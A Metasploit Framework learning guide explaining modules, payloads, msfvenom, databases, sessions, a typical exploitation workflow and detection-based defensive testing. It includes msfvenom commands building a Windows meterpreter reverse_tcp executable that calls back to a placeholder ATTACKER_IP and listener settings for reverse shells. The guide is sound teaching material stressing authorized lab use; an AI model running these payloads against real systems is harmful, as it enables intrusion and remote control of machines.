````markdown
# Metasploit Framework – Complete Learning Guide

## 1. Overview & Philosophy

Metasploit is a **Ruby-based penetration testing platform** that provides exploits, payloads, auxiliary modules, post-exploitation capabilities, and supporting tools.

It is **not a magic bullet**. Metasploit should support manual security testing rather than replace understanding.

### The Tool Debate

- **Critics:** Tools can create dependency, tunnel vision, and operational noise.
- **Proponents:** Tools save time, accelerate learning, and automate repetitive work.
- **Reality:** Understand what the tool is doing, verify its results manually, and use it where it provides genuine value.

---

## 2. Metasploit Editions

| Edition | Description |
|---|---|
| **Metasploit Framework (MSF)** | Free, open-source, command-line penetration-testing framework. |
| **Metasploit Pro** | Commercial edition with additional GUI, automation, reporting, collaboration, and integration features. |

---

## 3. Core Components

### msfconsole

`msfconsole` is the primary command-line interface for Metasploit.

Start it with:

```bash
msfconsole
````

Start without the banner:

```bash
msfconsole -q
```

Useful features include:

* Tab completion
* Module searching
* Module configuration
* Session management
* Database integration
* Resource scripts
* External command execution

### Directory Structure

| Path                               | Contents                                                    |
| ---------------------------------- | ----------------------------------------------------------- |
| `/usr/share/metasploit-framework/` | Main Metasploit installation                                |
| `modules/`                         | Exploit, payload, auxiliary, post, encoder, and NOP modules |
| `plugins/`                         | Additional integrations                                     |
| `scripts/`                         | Supporting scripts                                          |
| `tools/`                           | Command-line utilities                                      |
| `data/`                            | Framework data                                              |
| `lib/`                             | Core Ruby libraries                                         |
| `~/.msf4/`                         | User-specific data, history, loot, and local modules        |

---

## 4. Modules – The Building Blocks

Metasploit functionality is organized into modules.

### Module Types

| Type          | Purpose                                                                              |
| ------------- | ------------------------------------------------------------------------------------ |
| **Exploit**   | Attempts to exploit a vulnerability                                                  |
| **Payload**   | Code executed after successful exploitation                                          |
| **Auxiliary** | Scanning, enumeration, fuzzing, and other supporting functions                       |
| **Post**      | Post-exploitation activities                                                         |
| **Encoder**   | Transforms payloads to address encoding constraints                                  |
| **NOP**       | Generates no-operation instructions useful for certain exploit-development scenarios |
| **Evasion**   | Specialized modules intended to test defensive controls                              |

### Module Naming

A common structure is:

```text
<type>/<platform>/<service>/<name>
```

Example:

```text
exploit/windows/smb/ms17_010_eternalblue
```

### Searching for Modules

```text
search <keyword>
```

Use a module:

```text
use <module>
```

Display configuration:

```text
show options
```

Configure an option:

```text
set <option> <value>
```

Execute:

```text
run
```

or:

```text
exploit
```

---

## 5. Targets

Targets define the specific operating-system or application configurations that an exploit supports.

Inside a module:

```text
show targets
```

Select a target:

```text
set target <id>
```

When supported, automatic target selection can be used.

Historically, exploit targets may depend on platform-specific details such as:

* Operating-system version
* Service Pack
* Memory layout
* Return addresses
* Calling conventions
* Available protections

Modern exploitation often involves additional mitigations such as:

* DEP
* ASLR
* CFG
* EDR
* Application sandboxing

---

## 6. Payloads

A payload is code intended to execute after exploitation.

### Payload Types

| Type                | Description                                    |
| ------------------- | ---------------------------------------------- |
| **Single / Inline** | Complete payload delivered as one unit         |
| **Stager**          | Small component that establishes communication |
| **Stage**           | Larger payload transferred after the stager    |
| **Staged**          | Combination of a stager and stage              |

### Meterpreter

Meterpreter is an advanced Metasploit payload designed to provide an interactive post-exploitation session.

Capabilities can include:

* System information
* Process interaction
* File transfer
* Network configuration
* Session management
* Pivoting
* Command execution

Common commands include:

```text
getuid
ps
shell
download
upload
route
portfwd
```

Additional extensions may provide functionality such as credential and token interaction where supported.

### Selecting a Payload

```text
show payloads
```

Example:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Configure the listener:

```text
set LHOST <ATTACKER_IP>
set LPORT <PORT>
```

---

## 7. Encoders

Encoders transform payload data.

Historically, encoders were particularly useful for:

* Avoiding bad characters
* Satisfying exploit constraints
* Transforming shellcode representation

Example:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=ATTACKER_IP \
LPORT=4444 \
-e x86/shikata_ga_nai \
-i 5 \
-f exe \
-o payload.exe
```

### Important Security Note

Encoding should **not** be confused with reliable AV/EDR bypass.

Modern security products use multiple detection mechanisms, including:

* Behavioral detection
* Memory inspection
* Process telemetry
* Reputation
* Heuristics
* Machine learning
* Script inspection
* EDR correlation

Therefore, simple encoding is generally not a dependable evasion strategy.

---

## 8. Databases & Workspaces

Metasploit can integrate with PostgreSQL to organize assessment information.

Information may include:

* Hosts
* Services
* Credentials
* Loot
* Notes
* Vulnerability information

### Database Status

```text
db_status
```

### Connect to a Database

```text
db_connect
```

### Scan and Store Results

```text
db_nmap -sV <TARGET>
```

### View Information

```text
hosts
services
creds
loot
notes
```

### Workspaces

Create a workspace:

```text
workspace -a <name>
```

Switch workspaces:

```text
workspace <name>
```

List workspaces:

```text
workspace
```

### Import Scan Results

```text
db_import <file.xml>
```

### Export Database Information

```text
db_export -f xml backup.xml
```

---

## 9. Plugins

Plugins extend Metasploit functionality.

They are commonly located under:

```text
/usr/share/metasploit-framework/plugins/
```

Load a plugin:

```text
load <plugin_name>
```

Example:

```text
load nessus
```

Some post-exploitation functionality is provided through Meterpreter extensions rather than traditional Metasploit plugins.

---

## 10. Sessions & Jobs

### Sessions

Sessions represent active connections established with targets.

List sessions:

```text
sessions -l
```

Interact with a session:

```text
sessions -i <id>
```

Background the current session:

```text
background
```

or:

```text
Ctrl+Z
```

### Jobs

Jobs are background tasks.

List jobs:

```text
jobs -l
```

Terminate a job:

```text
jobs -k <id>
```

Run an operation as a background job:

```text
exploit -j
```

Jobs are useful when managing multiple authorized testing operations simultaneously.

---

## 11. MSFvenom – Custom Payload Generation

`msfvenom` combines payload generation and encoding functionality.

### Common Options

| Option  | Purpose                                             |
| ------- | --------------------------------------------------- |
| `-p`    | Select payload                                      |
| `LHOST` | Callback/listener address                           |
| `LPORT` | Callback/listener port                              |
| `-f`    | Output format                                       |
| `-e`    | Select encoder                                      |
| `-i`    | Encoder iterations                                  |
| `-o`    | Output file                                         |
| `-x`    | Use a template executable                           |
| `-k`    | Attempt to preserve original template functionality |

### Example

For an authorized lab:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=ATTACKER_IP \
LPORT=4444 \
-f exe \
-o payload.exe
```

MSFvenom supports many output formats, depending on the selected payload and platform.

---

## 12. Defensive Considerations & Evasion

Understanding defensive controls is important when using Metasploit in authorized assessments.

### Endpoint vs Perimeter Protection

**Endpoint controls:**

* Antivirus
* EDR
* Host firewall
* Application control
* Process monitoring
* Script logging

**Perimeter/network controls:**

* Firewalls
* IDS/IPS
* Proxies
* Network monitoring
* DNS security
* Network segmentation

### Detection Methods

#### Signature-Based Detection

Looks for known byte sequences, files, or patterns.

#### Heuristic Detection

Identifies suspicious characteristics without relying exclusively on known signatures.

#### Behavioral Detection

Observes what a process actually does, such as:

```text
Office application
      ↓
PowerShell
      ↓
Network connection
      ↓
Suspicious process creation
```

#### Network Detection

Analyzes:

* Connection patterns
* Destination addresses
* Protocol behavior
* Beaconing
* Unexpected outbound connections

### Defensive Testing

Instead of focusing only on bypassing defenses, use Metasploit to answer questions such as:

* Did EDR detect the exploit?
* Was the process creation logged?
* Was the network connection detected?
* Did the SIEM receive the relevant telemetry?
* Was the security team alerted?
* Which control prevented exploitation?

This makes Metasploit useful for both offensive testing and defensive validation.

---

## 13. Metasploit 6 and Modern Security

Modern Metasploit releases include improvements across:

* Payload generation
* Protocol support
* Exploit reliability
* Meterpreter functionality
* Encryption
* Architecture support
* Post-exploitation capabilities

Do not assume that historical claims about a particular Metasploit version apply unchanged to current releases.

Always verify the behavior of the installed version:

```text
version
```

and:

```bash
msfvenom --help
```

---

## 14. Importing Custom Modules

Custom modules can be useful when an exploit or scanner is not included in the installed framework.

A typical workflow is:

```text
Download/Develop Module
        ↓
Place Module in Correct Path
        ↓
Reload Metasploit
        ↓
Search for Module
        ↓
Review Source
        ↓
Use in Authorized Environment
```

A common user module location is:

```text
~/.msf4/modules/
```

For example:

```text
~/.msf4/modules/exploits/windows/http/
```

Reload modules:

```text
reload_all
```

Or load a custom path:

```text
loadpath /path/to/modules
```

### Security Consideration

Never blindly install a Ruby module from an untrusted source.

Review the source code first and understand:

* Network connections
* Commands executed
* Files created
* Credentials accessed
* Payload behavior
* Dependencies

---

## 15. Writing Custom Modules

Custom modules can be developed when existing Metasploit functionality does not meet an assessment requirement.

A module commonly contains:

* Name
* Description
* Author information
* References
* Disclosure date
* Platform
* Targets
* User-configurable options
* Exploitation logic

Useful Metasploit mixins can provide functionality for:

* HTTP communication
* File handling
* Payload handling
* Reporting
* Protocol interaction

A good development approach is:

```text
Study Existing Module
        ↓
Understand Module Structure
        ↓
Create Minimal Module
        ↓
Implement Options
        ↓
Implement Safe Test Logic
        ↓
Test in Lab
        ↓
Add Error Handling
        ↓
Document
```

---

## 16. Typical Metasploit Workflow

### 1. Reconnaissance

Identify:

* Hosts
* Ports
* Services
* Versions
* Operating systems

Example:

```text
db_nmap -sV <TARGET>
```

### 2. Search

Search for relevant modules:

```text
search <service>
search <CVE>
search type:exploit <keyword>
```

### 3. Select

```text
use exploit/<path>
```

### 4. Review

```text
info
show options
show targets
show payloads
```

### 5. Configure

Set required options:

```text
set RHOSTS <TARGET>
set RPORT <PORT>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
```

### 6. Validate

Where supported:

```text
check
```

A `check` result is not always proof that exploitation will succeed.

### 7. Execute

```text
run
```

or:

```text
exploit
```

### 8. Interact

If a session is created:

```text
sessions -l
sessions -i <ID>
```

### 9. Post-Exploitation

Within the authorized scope:

* Identify the current user
* Enumerate the host
* Determine privileges
* Collect evidence
* Assess lateral movement opportunities

### 10. Document

Record:

* Target
* Module
* Vulnerability
* Configuration
* Result
* Evidence
* Impact
* Remediation

---

## 17. Example Lab Workflow

A controlled penetration-testing lab might follow:

```text
Lab Target
    ↓
Nmap Enumeration
    ↓
Service Identification
    ↓
Version Detection
    ↓
Metasploit Search
    ↓
Module Review
    ↓
Option Configuration
    ↓
Check
    ↓
Controlled Exploitation
    ↓
Session
    ↓
Post-Exploitation
    ↓
Evidence
    ↓
Report
```

The important lesson is that **Metasploit should be used after understanding the target**, not as a replacement for enumeration.

---

## 18. Useful Command Reference

### Console

```text
msfconsole
search <keyword>
info
show options
show targets
show payloads
set <option> <value>
unset <option>
run
exploit
check
back
```

### Sessions

```text
sessions -l
sessions -i <ID>
background
sessions -k <ID>
```

### Jobs

```text
jobs -l
jobs -k <ID>
```

### Database

```text
db_status
db_nmap -sV <TARGET>
hosts
services
creds
loot
notes
workspace
workspace -a <NAME>
db_import <FILE>
db_export -f xml <FILE>
```

### Module Management

```text
reload_all
loadpath <PATH>
search <KEYWORD>
use <MODULE>
```

---

## 19. Troubleshooting Methodology

When a module fails, do not immediately assume the exploit is broken.

Check:

### Target

```text
Is the target reachable?
Is the expected port open?
Is the service actually running?
```

### Version

```text
Does the target version match the vulnerability?
```

### Configuration

```text
RHOSTS
RPORT
LHOST
LPORT
TARGET
PAYLOAD
```

### Network

```text
Can the target reach the callback address?
Is NAT involved?
Is a firewall blocking the connection?
Is the correct network interface selected?
```

### Payload

```text
Is the architecture correct?
Is the payload compatible?
Is the selected payload supported by the exploit?
```

### Exploit

```text
Does check indicate vulnerability?
Does the module documentation mention limitations?
Is the target configuration supported?
```

The correct workflow is:

```text
Failure
  ↓
Read Error
  ↓
Verify Target
  ↓
Verify Version
  ↓
Verify Options
  ↓
Verify Network
  ↓
Verify Payload
  ↓
Read Module Documentation
  ↓
Test Again
```

---

## 20. Final Advice

* **Understand the vulnerability before launching an exploit.**
* **Do not blindly trust automated results.**
* **Use `info`, `show options`, `show targets`, and `check`.**
* **Understand the payload being delivered.**
* **Keep Metasploit updated.**
* **Use isolated labs for experimentation.**
* **Document every significant action.**
* **Verify findings manually whenever possible.**
* **Use Metasploit to accelerate work, not replace your skills.**
* **Treat payloads and custom modules as code that must be reviewed.**
* **Always stay within the authorized scope.**

---

## 🧠 Core Mental Model

The most important concept is:

```text
Metasploit
│
├── Recon / Enumeration
│
├── Modules
│   ├── Exploits
│   ├── Auxiliary
│   ├── Payloads
│   ├── Post
│   ├── Encoders
│   ├── NOPs
│   └── Evasion
│
├── Sessions
│   ├── Shell
│   └── Meterpreter
│
├── Database
│   ├── Hosts
│   ├── Services
│   ├── Credentials
│   ├── Loot
│   └── Notes
│
└── Reporting / Documentation
```

### The Golden Rule

```text
ENUMERATE
    ↓
UNDERSTAND
    ↓
VALIDATE
    ↓
EXPLOIT
    ↓
VERIFY
    ↓
DOCUMENT
```

> **Metasploit is a powerful assistant, not a replacement for critical thinking. The strongest penetration tester understands what the framework is doing, why it works, how to reproduce the underlying technique manually, and how defenders can detect it.**

**Use Metasploit only against systems you own or are explicitly authorized to test.**

```
```

